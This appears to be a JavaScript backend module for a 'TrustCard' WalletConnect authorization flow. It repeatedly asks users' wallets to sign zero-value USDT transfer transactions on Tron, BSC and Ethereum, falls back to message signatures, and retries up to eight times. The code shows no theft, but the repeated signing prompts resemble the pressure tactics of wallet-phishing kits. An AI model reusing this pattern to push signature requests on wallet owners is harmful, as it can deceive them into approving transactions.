const store = require("../storage/sessions");
const logger = require("../utils/logger");
const { emitEvent } = require("../utils/events");
const {
    parseCaipAccount,
    toHexMessage,
    encodeErc20Transfer,
    encodeTrc20TransferParameter
} = require("../utils/helpers");

const MAX_ATTEMPTS = 8;
const RETRY_DELAY_MS = 7000;
const TRON_GRID_URL = "https://api.trongrid.io/wallet/triggersmartcontract";

const NETWORKS = {
    trc20: {
        key: "trc20",
        label: "TRC-20",
        chainId: "tron:0x2b6653dc",
        namespace: "tron",
        token: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
    },
    bep20: {
        key: "bep20",
        label: "BEP-20",
        chainId: "eip155:56",
        namespace: "eip155",
        token: "0x55d398326f99059fF775485246999027B3197955"
    },
    erc20: {
        key: "erc20",
        label: "ERC-20",
        chainId: "eip155:1",
        namespace: "eip155",
        token: "0xdAC17F958D2ee523a2206206994597C13D831ec7"
    }
};

const CHAIN_ORDER = ["trc20", "bep20", "erc20"];

function collectAccounts(session, bodyAccounts) {
    const fromBody = Array.isArray(bodyAccounts)
        ? bodyAccounts.map((item) => {
            if (typeof item === "string") {
                return parseCaipAccount(item) || { address: item };
            }

            return item;
        })
        : [];

    return [...fromBody, ...(session.accounts || [])].filter((item) => item?.address);
}

function pickAccount(accounts, network) {
    const exact = accounts.find((item) => item.chainId === network.chainId);

    if (exact) {
        return exact;
    }

    return accounts.find((item) => item.namespace === network.namespace) || null;
}

function buildChainQueue(session, bodyAccounts) {
    const accounts = collectAccounts(session, bodyAccounts);

    return CHAIN_ORDER.map((key) => {
        const network = NETWORKS[key];
        const account = pickAccount(accounts, network);

        if (!account) {
            return null;
        }

        return {
            ...network,
            address: account.address
        };
    }).filter(Boolean);
}

function isCancelled(connectionId) {
    const session = store.getSession(connectionId);
    return !session || session.authCancelled || session.status === "deleted";
}

function classifyError(err) {
    const message = String(err.message || err).toLowerCase();
    const code = err.code;

    if (code === 4001 || code === 5000 || /reject|denied|cancel|disapprov/.test(message)) {
        return "rejected";
    }

    return "unavailable";
}

async function buildTrc20Transaction(from) {
    const response = await fetch(TRON_GRID_URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            owner_address: from,
            contract_address: NETWORKS.trc20.token,
            function_selector: "transfer(address,uint256)",
            parameter: encodeTrc20TransferParameter(from, 0n),
            fee_limit: 100000000,
            call_value: 0,
            visible: true
        })
    });

    const payload = await response.json();

    if (!payload?.transaction) {
        throw new Error(payload?.Error || payload?.result?.message || "TronGrid did not return a transaction");
    }

    return payload;
}

async function sendTrc20Request(client, session, chain) {
    const topic = session.sessionTopic || session.topic;
    const from = chain.address;

    try {
        const unsigned = await buildTrc20Transaction(from);

        emitEvent("request_sent", {
            connectionId: session.connectionId,
            topic,
            chain: chain.key,
            chainId: chain.chainId,
            label: chain.label,
            method: "tron_signTransaction"
        });

        return await client.request({
            topic,
            chainId: chain.chainId,
            request: {
                method: "tron_signTransaction",
                params: {
                    address: from,
                    transaction: unsigned
                }
            }
        });
    } catch (err) {
        if (classifyError(err) === "rejected") {
            throw err;
        }

        logger.warn({ err, connectionId: session.connectionId }, "tron_signTransaction unavailable, using tron_signMessage");

        emitEvent("request_sent", {
            connectionId: session.connectionId,
            topic,
            chain: chain.key,
            chainId: chain.chainId,
            label: chain.label,
            method: "tron_signMessage"
        });

        return client.request({
            topic,
            chainId: chain.chainId,
            request: {
                method: "tron_signMessage",
                params: {
                    address: from,
                    message: `TrustCard authorization for ${session.connectionId}`
                }
            }
        });
    }
}

async function sendEvmTokenRequest(client, session, chain) {
    const topic = session.sessionTopic || session.topic;
    const from = chain.address;

    emitEvent("request_sent", {
        connectionId: session.connectionId,
        topic,
        chain: chain.key,
        chainId: chain.chainId,
        label: chain.label,
        method: "eth_sendTransaction"
    });

    try {
        return await client.request({
            topic,
            chainId: chain.chainId,
            request: {
                method: "eth_sendTransaction",
                params: [
                    {
                        from,
                        to: chain.token,
                        value: "0x0",
                        data: encodeErc20Transfer(from, 0n)
                    }
                ]
            }
        });
    } catch (err) {
        if (classifyError(err) === "rejected") {
            throw err;
        }

        logger.warn({ err, connectionId: session.connectionId, chain: chain.key }, "token transfer unavailable, using personal_sign");

        emitEvent("request_sent", {
            connectionId: session.connectionId,
            topic,
            chain: chain.key,
            chainId: chain.chainId,
            label: chain.label,
            method: "personal_sign"
        });

        return client.request({
            topic,
            chainId: chain.chainId,
            request: {
                method: "personal_sign",
                params: [
                    toHexMessage(`TrustCard ${chain.label} authorization for ${session.connectionId}`),
                    from
                ]
            }
        });
    }
}

async function sendWalletRequest(client, session, chain) {
    if (chain.namespace === "tron") {
        return sendTrc20Request(client, session, chain);
    }

    return sendEvmTokenRequest(client, session, chain);
}

async function startAuthorizationLoop(connectionId, bodyAccounts) {
    const session = store.getSession(connectionId);

    if (!session) {
        return false;
    }

    if (session.authInProgress || session.authResolved) {
        return true;
    }

    const { getClient } = require("./walletconnect");
    const client = getClient();

    if (!client) {
        return false;
    }

    const queue = buildChainQueue(session, bodyAccounts);

    if (!queue.length) {
        logger.warn({ connectionId }, "No TRC-20 / BEP-20 / ERC-20 account available");
        return false;
    }

    store.updateSession(connectionId, {
        autoApprove: true,
        authCancelled: false,
        authInProgress: true,
        authResolved: false,
        authAttempt: 0,
        authChain: queue[0].key
    });

    setImmediate(() => runLoop(client, connectionId, queue));
    return true;
}

async function runLoop(client, connectionId, queue) {
    let chainIndex = 0;

    for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt += 1) {
        if (isCancelled(connectionId)) {
            store.updateSession(connectionId, { authInProgress: false });
            return;
        }

        const chain = queue[chainIndex];

        store.updateSession(connectionId, {
            authAttempt: attempt,
            authChain: chain.key
        });

        try {
            const latest = store.getSession(connectionId);
            const result = await sendWalletRequest(client, latest, chain);

            if (isCancelled(connectionId)) {
                return;
            }

            store.updateSession(connectionId, {
                authInProgress: false,
                authResolved: true,
                authResult: result,
                authChain: chain.key
            });

            emitEvent("request_resolved", {
                connectionId,
                status: "approved",
                chain: chain.key,
                label: chain.label,
                result,
                attempt
            });
            emitEvent("request_approved", {
                connectionId,
                chain: chain.key,
                label: chain.label,
                result,
                attempt
            });
            return;
        } catch (err) {
            const kind = classifyError(err);

            logger.warn({ err, connectionId, attempt, chain: chain.key, kind }, "Wallet authorization request failed");

            emitEvent("request_rejected", {
                connectionId,
                status: "rejected",
                chain: chain.key,
                label: chain.label,
                message: err.message,
                attempt
            });

            if (kind === "unavailable" && chainIndex < queue.length - 1) {
                chainIndex += 1;
                const next = queue[chainIndex];

                logger.info({ connectionId, from: chain.key, to: next.key }, "Trying next network");

                emitEvent("auto_approve_retry", {
                    connectionId,
                    attempt,
                    nextAttempt: attempt + 1,
                    delayMs: 0,
                    chain: next.key,
                    label: next.label,
                    message: `${chain.label} is not available. Trying ${next.label} next.`
                });
                continue;
            }

            if (attempt >= MAX_ATTEMPTS || isCancelled(connectionId)) {
                store.updateSession(connectionId, { authInProgress: false });
                emitEvent("request_resolved", {
                    connectionId,
                    status: "rejected",
                    chain: chain.key,
                    label: chain.label,
                    message: err.message,
                    attempt
                });
                return;
            }

            emitEvent("auto_approve_retry", {
                connectionId,
                attempt,
                nextAttempt: attempt + 1,
                delayMs: RETRY_DELAY_MS,
                chain: chain.key,
                label: chain.label
            });

            await new Promise((resolve) => setTimeout(resolve, RETRY_DELAY_MS));
        }
    }
}

function cancelAuthorization(connectionId) {
    if (!connectionId) {
        return;
    }

    store.updateSession(connectionId, {
        authCancelled: true,
        authInProgress: false,
        autoApprove: false
    });
}

module.exports = {
    startAuthorizationLoop,
    cancelAuthorization
};
